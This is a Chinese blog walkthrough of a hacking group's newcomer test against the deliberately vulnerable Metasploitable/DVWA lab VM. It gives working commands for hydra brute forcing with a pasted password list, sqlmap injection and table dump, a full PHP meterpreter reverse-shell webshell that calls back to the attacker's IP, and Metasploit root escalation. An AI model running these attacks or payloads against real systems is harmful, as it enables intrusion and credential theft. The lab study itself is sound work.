# 锏幕 新人测试教程


**注意事项：本期内容中的IP地址可能与你的实际情况不同！！请根据实际情况更改对应IP地址！！**

<!--more-->
## 开场白

诶嘿～！我又回来了，我看到很多萌新不知道怎么过锏幕的新人测试，特意为此写篇博客做个教程。

好让你们看完过一下，那么…

嘛.. 我们开始吧..
## 考核内容
|类型|内容|备注|
|:-:|:-|:-|
|名称|锏幕四项萌新考核 |考核的名称|
|难度|Low|难度系数|
|第一关|简单破解Web表单|必须通过，否则无法进行下一关|
|第二关|简单SQL注入|必须通过|
|第三关|操作系统渗透|必须通过|
|第四关|获取root权限|必须通过|

**PS：锏幕组织的新人考核是以metasploitable作为标准的，因此我会写出如何准备环境**

## 环境准备

上面已经说明了需要用到**metasploitable**，那么接下来我会写出如何配置靶机环境
### 第一步|下载&解压

首先我们需要去下载metasploitable这个靶机套餐的虚拟机文件，我们可以在各种搜索引擎中找到它我这里会给出地址。

[点击这里可以下载](https://sourceforge.net/projects/metasploitable/)

点进去以后点击那个巨大的**Download**即可下载。

嘛..我已经下载好了，是个**zip**文件。

然后你需要解压，两种方法:

* Linux
  * unzip命令
  * file-roller(GUI)
* Windows
  * 各种解压软件

这个不用多说吧..

**解压个东西都不会还想加入锏幕?**

![](/img/截图_2019-10-20_05-52-55.png)

解压完了就可以进行下一步了。

### 第二步|创建虚拟机

你打开文件夹就可以看到这里面有个虚拟机配置文件和一个虚拟硬盘文件，它可以直接用VMware导入运行，因此我这里给出VirtualBox的方法

首先，打开你的VirtualBox

![](/img/截图_2019-10-20_05-58-44.png)

然后点击上面的新建…(这个还要教吗?)

![](/img/截图_2019-10-20_05-59-53.png)

然后选择的虚拟机类型和操作系统版本，**这里要注意！！必须选“64位的其他Linux”，并且设置至少256MB的内存！否则无法启动！**
![](/img/截图_2019-10-20_06-00-34.png)

![](/img/截图_2019-10-20_06-02-10.png)

然后这里就**不用创建虚拟硬盘**了，我们选择**使用现有的虚拟硬盘文件**。

![](/img/截图_2019-10-20_06-04-29.png)

点击这个东西，

![](/img/截图_2019-10-20_06-05-21.png)

然后点击**注册**

![](/img/截图_2019-10-20_06-07-17.png)

找到你的**metasploitable**目录并且找到这个**vmdk文件**，这个就是虚拟硬盘文件。

![](/img/截图_2019-10-20_06-08-57.png)

点击打开，然后就会回到这个窗口，选择你刚刚注册的虚拟硬盘。

![](/img/截图_2019-10-20_06-11-10.png)

接下来就可以创建了

![](/img/截图_2019-10-20_06-12-03.png)

**在启动之前要把虚拟机的联网改成桥接**

**依次点击设置——网络**

然后就会跳出这个页面

![](/img/截图_2019-10-20_06-16-46.png)

将它改成桥接网卡即可

![](/img/截图_2019-10-20_06-17-25.png)

最后启动虚拟机，你的靶机环境就搭建完成了。
![](/img/截图_2019-10-20_06-12-40.png)
![](/img/截图_2019-10-20_06-18-39.png)

开机之后**不要去操作靶机**也**不要去理会它**

![](/img/截图_2019-10-20_06-19-35.png)

## 考核过程

现在环境已经准备完毕了，我们可以开始进行过关了。接下来请**认真看！认真看！认真看！**（重要的事情说三遍）
### 嗅探！扫描！

我们刚刚搭建完靶机却不知道它的**IP地址**，这意味着我们不知道**它的位置**，那么怎么办呢？这个时候我们要用到**nmap**把他扫出来。

不过前提是首先你得知道你所处的IP段，我的环境是局域网，DHCP地址段是`192.168.0.1/24`

执行
```bash
$ sudo nmap -v -O 192.168.0.1/24
![](/img/截图_2019-10-20_06-27-08.png)
```

可以发现它很快就扫出来了

![](/img/截图_2019-10-20_06-31-32.png)

终端里获取到的信息如下，说明这个192.168.0.107就是靶机的地址
```txt
Nmap scan report for 192.168.0.107
Host is up (0.00028s latency).
Not shown: 977 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
25/tcp   open  smtp
53/tcp   open  domain
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
512/tcp  open  exec
513/tcp  open  login
514/tcp  open  shell
1099/tcp open  rmiregistry
1524/tcp open  ingreslock
2049/tcp open  nfs
2121/tcp open  ccproxy-ftp
3306/tcp open  mysql
5432/tcp open  postgresql
5900/tcp open  vnc
6000/tcp open  X11
6667/tcp open  irc
8009/tcp open  ajp13
8180/tcp open  unknown
MAC Address: 08:00:27:3F:40:18 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Uptime guess: 0.002 days (since Sun Oct 20 06:23:17 2019)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=192 (Good luck!)
IP ID Sequence Generation: All zeros
```

那么我已经找到靶机了，接下来就可以正式进行攻击了。
### 第一关|简单破解Web表单

接下来我们在浏览器输入刚刚扫描到的地址，就可以进入靶机上的网页了。

![](/img/截图_2019-10-20_06-41-20.png)

> 小白：唔？为什么你的IP不是上面写的107了，变成4了
>
> 回答：我写着写着就断网了，搭建了一个虚拟局域网，所以靶机IP变了，又重新扫了一遍。。但是正常情况下，这个IP是不会变的，所以请无视这个地址具体是多少了，每个人都不一样的。
>

接下来我们点击**DVWA**，进入了一个这样的帐号密码登录页面，我们第一关的目的就是破解它。

![](/img/截图_2019-10-20_06-45-23.png)

QwQ，然后..是不是到这里就一脸懵逼了

#### 抓包

嘛，记得**Burpsuite**吗？

就是一个java写的软件

![](/img/截图_2019-10-20_06-51-38.png)

试试？

在使用Burpsuite之前，你需要给浏览器设置burp的代理，我这里使用的是firefox

那么，在burpsuite里面依次点击

`Proxy（左上角内个）——Options`

![](/img/截图_2019-10-20_06-56-54.png)

从这里我们就获得了burp默认的代理地址`127.0.0.1:8080`

接下来要到浏览器里设置它，

简单地给出截图吧

![](/img/截图_2019-10-20_07-02-05.png)

![](/img/截图_2019-10-20_07-03-59.png)

然后点确定，就这样设置好了

嘛…**浏览器都不会用**的也别来锏幕了

然后回到burp，确认一下这个**Intercept**是否为**on**，如果是就进行下一步操作，如果不是就点一下。。。

![](/img/截图_2019-10-20_07-06-34.png)

接下来，回到浏览器

![](/img/截图_2019-10-20_07-09-10.png)

emmmm….我们知道一般网站的默认管理员帐号都是**admin**，这里也不例外，接下来我们试着在Username这个框框里输入`admin`，**Password**这个框框里随便输入点什么

![](/img/截图_2019-10-20_07-11-43.png)

然后点击**login**。

接下来我们就抓取到了这个数据包了，下面还有我输入过的信息

![](/img/截图_2019-10-20_07-13-04.png)

```http
POST /dvwa/login.php HTTP/1.1
Host: 192.168.0.4
User-Agent: Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 46
Connection: close
Referer: http://192.168.0.4/dvwa/login.php
Cookie: security=high; PHPSESSID=091eeaf25f53c1c6c6dd230cd5add7be
Upgrade-Insecure-Requests: 1

username=admin&password=6666666666&Login=Login
```

嘛…这么一大堆看着都头晕

诶嘿，其实这里你只需要保存这一部分就可以了

```txt
username=admin&password=6666666666&Login=Login
```

嘛，上面这点还不够呢，还需要获取一段信息。

现在网页看起来像时间停止了一样一动不动的对不对？

那么我来解释一下burp这里三个按钮的意思

* Forward:放行，让网页继续执行抓到的数据包
* Drop:丢弃，将这个数据包扔了，网页就执行不了了

现在，我们点击`Forward`，放行这个数据包

这时，网页下面弹出了一段字符串

![](/img/截图_2019-10-20_07-26-23.png)

码下来，一会儿要用到的

```txt
Login failed
```

接下来把burpsuite关掉，浏览器代理关掉，这个不多说步骤了。

嗯…整个抓包的过程就完成了。然后就是进行**爆破**了

#### 爆破

嘛…最精彩的部分来了

你知道**hydra**吗？如果不知道那么请出门左转用搜索引擎查一下。

我们要给hydra设置这么几个参数

* -l + 用户名 : 这个是设置需要破解的用户名，我们尝试admin
* -P 密码字典 : 指定一个txt文件，里面都是依次猜测需要的密码
* -V : 显示详细过程
* -n es : 尝试空口令登录
* IP地址 : 也就是目标的地址咯，上面的`192.168.0.4`
* http-post-form : 指定爆破类型，后面还要加爆破的页面地址，这里是http的post页面 没有密码字典？我这里提供一个，你自己复制进一个txt文件里就可以了。

```txt
123456
12345
123456789
Password
iloveyou
princess
rockyou
1234567
12345678
abc123
admin888
admin123
test
password
123456
a123456
123456a
5201314
111111
woaini1314
qq123456
123123
0
1qaz2wsx
1q2w3e4r
qwe123
7758521
123qwe
a123123
123456aa
woaini520        
woaini
100200
1314520
woaini123
123321
q123456
123456789
123456789a
5211314
asd123
a123456789
z123456
asd123456
a5201314
aa123456
zhang123
aptx4869
123123a
1q2w3e4r5t
1qazxsw2
5201314a
1q2w3e
aini1314
31415926
q1w2e3r4
123456qq
woaini521
1234qwer
a111111
520520
iloveyou
abc123 
110110
111111a          
123456abc        
w123456
7758258
123qweasd
159753
qwer1234
a000000
qq123123
zxc123
123654
abc123456
123456q
qq5201314
12345678
000000a          
456852
as123456
1314521          
112233
521521
qazwsx123
zxc123456
abcd1234
asdasd
666666
love1314
QAZ123
aaa123
q1w2e3
aaaaaa
a123321
123000
11111111
12qwaszx
5845201314
s123456
nihao123
caonima123
zxcvbnm123
wang123
159357
1A2B3C4D
asdasd123
584520
753951
147258
1123581321
110120
qq1314520        
123456.com
123123
idc123!@#
123
aaa123!@#
qq123.com
123456
wantian##*(
qwe123
qwe1234
123qwe
123qwer
1qaz2wsx
1qaz
159753
!Q@W#E
159357
147369
1234567
password
aistar123<>!N
321
idcji2010
qqqqqq
1q2w3e
q1w2e3
336699
abc123
asd123
123654
1
111111
111
111qqq...
123456
953139.
0258
111qqq!!!
1236
qqii
tyinfo
abcd36888
rst_login
OAOidc
OAOidc123!@#
OAOidc123
esin888
qwer
power123
power.liu
power.yu
dns99+588
zhengui
idc0.1
7715123
sdwer
power.zhao
sdwer123
qwer1234
esincs
jspower123.0
5656789
2323456
power.com
power123.0
power0.123
jspower.com
123123
hlwj0519-1205.jf
123321
zaxscdvf
..0
!@#$QWER
95313
1231321
321123
vipnew
idc0514
1235698
235689
326598
112233
111222
qqqqqq
idc11
21vianet
#@!ewq
1010
111qqq
1234%^&*
12345^&*()
123456
4867086
1234567
123!@#
123456!@#
10000
794613
784512
895623
789456
456123
654321
123!@#
1234!@#$
11185
12345!@#$%
qwe123!@#
!@#123
!@#321
123#@!
19861212
19831212
19841020
#@!123
#@!321
idcidc
12345^&*()
!@#$%^&*()
)(*&^%$#@!
0987654321
tyidc
1122
111222
idc123
idcidcok
idcuser
abcd1234
1234abcd
caonima
1q2w3e4r
888888
admin!@#
abc!@#
!Q@W#E$R%T
idc2010
1236
1q2w3e4r5t
qqaazz
asdasd
admin
admin1
admin123
aaa111
111aaa
123aaa
lh222
lhidc
123a
a123
123456a
a123456
aaa123
qazwsx
qazxsw
0123
123112233
123111
www.7x24.cn
shisp.net
123000
idc0123
1230..
123456789
123456qwe
123qwe
12345qwert
zxcvbnm
qwerty
qweqwe
q1w2e3
123ewq
qwe321
1qazxsw2
12qwaszx
1234rewq
123456.com
lituobestsanmao
!@#19841010
msfadmin
19885510
xyidc_2006
95217189
95217
chinayixun
huachen1258zz
sanhe123
3H8IDC!!#
3H8IDC72sanhe000
xiaoyili
sanhe000~!@#  
3H8IDC!!#
ccfeng66131421  
!@#59560955
tkggja850518`1
zhengui
anada325!@#
www.txwscx.comsritgyxf2sxy19831122zx
ZHONGGUO$#@!999@
admin13906271234
395835961
senlinyan
3203672
9527999!!!
P@ssw0rd
huaiyukeji115
idc9aewr42
idc0.1
123asdasd
qsx6059410172.
idc0001
idc800888
idc46121
123asdasd
882627.8
luofei520!@#123
852799!!!
idc0123.0
513tyml.com
abc123!@#
1q2w3e,./? ><
6504710shuazuan
123.789+
123asdasd
752883855.
senlinyan$
admin001
6695zx
scictd9821622
365obsserver!
ranglm123456
13920225257
idc925111
1qaz@wsx#edc
.......199
xu15817079919
yanjin0429
zhangznw
13527380230
idc0.01
idc123&123
662766
122.224
huaiyukeji115
.......199@
liuzhangzi1988
123456!@#$%^
idc0123
dahouzi110
123.789+
trista188#**
mm1237
07736056123
TnHoo15862380404
idc0123
189532210113
idc123
gedingfeng1102888
```

以及你需要把上面抓到的`username=admin&password=6666666666&Login=Login`和`Login failed`整合一下变成这样:

```txt
username=^USER^&password=^PASS^&Login=Login:Login failed
```

整合一下，需要执行的指令就是下面这个了

```bash
$ hydra -l admin -P ./密码字典/pass-wake.txt -V -e ns 192.168.0.4 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```

它很快就会给你破解出来

![](/img/截图_2019-10-20_07-49-15.png)

![](/img/截图_2019-10-20_07-50-18.png)

由上图可看出，密码就是`password`

接下来我们尝试登录

![](/img/截图_2019-10-20_07-51-58.png)

如果成功登录，出现了这个页面，那么恭喜你，第一关完美通过
![](/img/截图_2019-10-20_07-54-11.png)

### 第二关|简单SQL注入

第一关过了以后，我们要看看它的数据库里面有什么

#### 抓包

我们回到他这个网页，先进入`DVWA Security`，把安全等级改成`Low`

![](/img/截图_2019-11-03_13-11-42.png)

再点击`SQL Injection`这个按钮，进入这个页面。

![](/img/截图_2019-11-03_12-55-19.png)

接下来打开burp，按照之前的操作一样，监听，抓包什么的（这里我上面写得很详细了）

在burpsuite的监听下，在这个输入框里随便输入一些内容，然后点击这个`Submit`按钮，Burp就会自动抓包了

![](/img/截图_2019-11-03_13-12-22.png)

将它保存为一个txt文件，但是要记住它的位置，比如我的是`~/get.txt`

![](/img/截图_2019-11-03_12-58-29.png)

这样抓包工作就完成了。
#### 使用sqlmap注入

接下来用到的工具就是sqlmap了，这里只写出注入的流程，具体的教程请参考由帝的视频

我们先扫描一下注入点
```bash
$ sqlmap -r "get.txt"
```

![](/img/截图_2019-11-03_13-17-27.png)

![](/img/截图_2019-11-03_13-18-06.png)

这里均选`y`即可。

![](/img/截图_2019-11-03_13-18-59.png)

最后一个选项选`n`不必浪费时间了。

![](/img/截图_2019-11-03_13-19-51.png)

接下来我们就获得我们需要的信息了，数据库版本什么的。我把它贴出来吧。
```txt
sqlmap identified the following injection point(s) with a total of 149 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: id=6666666' OR NOT 1144=1144#&Submit=Submit

    Type: error-based
    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
    Payload: id=6666666' OR ROW(6268,9799)>(SELECT COUNT(*),CONCAT(0x7162786b71,(SELECT (ELT(6268=6268,1))),0x716a767071,FLOOR(RAND(0)*2))x FROM (SELECT 9569 UNION SELECT 7660 UNION SELECT 7717 UNION SELECT 8645)a GROUP BY x)-- dPXL&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=6666666' AND (SELECT 4811 FROM (SELECT(SLEEP(5)))hDuM)-- SMOw&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=6666666' UNION ALL SELECT NULL,CONCAT(0x7162786b71,0x794f4b67535851624375466379624550476a6243584e4b754d7250524e524d7a6c70587370704877,0x716a767071)#&Submit=Submit
---
[13:19:30] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 4.1
[13:19:30] [INFO] fetched data logged to text files under '/home/weepingdogel/.sqlmap/output/192.168.0.105'
```

接下来我们就要查看数据库里面的内容了，由于原因，我就不贴出逐级查看的代码了，我直接dump

```bash
$ sqlmap -r "~/get.txt" --dump
```

![](/img/截图_2019-11-03_13-26-48.png)

出来了。

如果你终端里获取到了以下信息，那么说明，第二关通过了

```txt
Database: dvwa
Table: users
[5 entries]
+---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+
| user_id | user    | avatar                                                | password                                    | last_name | first_name |
+---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+
| 1       | admin   | http://172.16.123.129/dvwa/hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      |
| 2       | gordonb | http://172.16.123.129/dvwa/hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     |
| 3       | 1337    | http://172.16.123.129/dvwa/hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       |
| 4       | pablo   | http://172.16.123.129/dvwa/hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      |
| 5       | smithy  | http://172.16.123.129/dvwa/hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        |
+---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+
```

### 第三关|操作系统渗透

Well,

接下来我们就要进行最关键的一环了，我们将使用Webshell的方式入侵靶机的操作系统。

知道PHP吗？我对它了解也不是很多，总之它可以被上传到服务器然后以可执行文件的方式运行。

这次也将使用PHP文件作为**木马**进行攻击。

#### 生成木马

我们用 **`msfvenom`** 这个命令来生成。执行

```bash
$ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.106 LPORT=4444 -o test.php
```

![](/img/截图_2019-11-03_13-35-25.png)

这样就生成好了。来看看里面有什么？
```php
/*<?php /**/ error_reporting(0); $ip = '192.168.0.106'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
```

只有一行～！这一行就是嘿嘿。。。自己看啦

我们加一些html上去吧:

```php
/*<?php /**/ error_reporting(0); $ip = '192.168.0.106'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();?>
<html>
<head>
<meta charset="utf-8" />
</head>
<body>
<h1>Hacked</h1>
</body>
</html>

```
接下来回到DVWA，在左下角点击 **`upload`** 进入上传页面，然后点击 **`选择文件`** 再点击 **`upload`** 即可。

将这个文件上传进去。

如果这都不会我就不多说了，**你连上传个文件都不会还想进锏幕？**

![](/img/截图_2019-11-03_13-42-57.png)

然后我们可以看到这么一串东西。

**`../../hackable/uploads/test.php succesfully uploaded!`**

说明你上传成功了，接下来要用到**msf**

我们在终端进入msf:

```bash
$ sudo msfconsole
```

不多讲了，走个命令流程，之前写过

调用模块:

```bash
msf5 > use exploit/multi/handler
```

按顺序执行:

```bash
msf5 exploit(multi/handler) > set lhost 192.168.0.106
```

```bash
msf5 exploit(multi/handler) > set lport 4444
```

```bash
msf5 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
```

```bash
msf5 exploit(multi/handler) > run
```

执行完后，如图:

![](/img/截图_2019-11-03_13-54-05.png)

接下来，我们会到浏览器，直接访问`http://192.168.0.105/dvwa/hackable/uploads/test.php`

这时，msf会收到反弹，如图:

![](/img/截图_2019-11-03_13-58-26.png)

![](/img/截图_2019-11-03_13-58-47.png)

可见权限小得可怜，不过也第三关就这样通过了。权限的问题我们会在第四关解决

### 第四关|获取root权限

你能做到这里说明你已经不是萌新了，最后一关：提权

这是最关键的一环，那么我们开始吧。

首先把我们刚刚获取的webshell放到后台:

```
meterpreter > background
```

然后我们使用这个模块`exploit/linux/local/udev_netlink`(用别的也可以，我个人喜欢用这个:)

```bash
msf5 exploit(multi/handler) > use exploit/linux/local/udev_netlink
```

模块的信息你可以自己输入 **`info`** 这个命令去查看，

然后我们设置刚刚webshell的session号，我的是2:

```bash
msf5 exploit(linux/local/udev_netlink) > set SESSION 2
```

最后执行 **`run`** 或者 **`exploit`** :

```bash
msf5 exploit(linux/local/udev_netlink) > exploit
```

这样我们就获取到最高权限了，如图:

![](/img/截图_2019-11-03_14-07-51.png)

我们来看看用户是不是root

```
meterpreter > getuid
```

或
```
meterpreter > shell
```

```
whoami
```

如图

![](/img/截图_2019-11-03_14-09-15.png)

然后，我们就通过了第四关，同时也通过了全部考核，接下来只要取证和提交截图就可以成为锏幕核心成员了。

---

## 结语

写了一个礼拜，全是即操作即写

看完还不会的，，，在下面留言吧..
## 参考链接

* [ArchWiki](https://wiki.archlinux.org/index.php/Main_page_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87))

* [Metasploitable下载地址](https://sourceforge.net/projects/metasploitable/)

* [由帝的sqlmap视频](https://www.bilibili.com/video/av59729967)

---

**注意：转载请注明出处，禁止用本博客去干一些作死的事情，否则后果自负，与我无关**

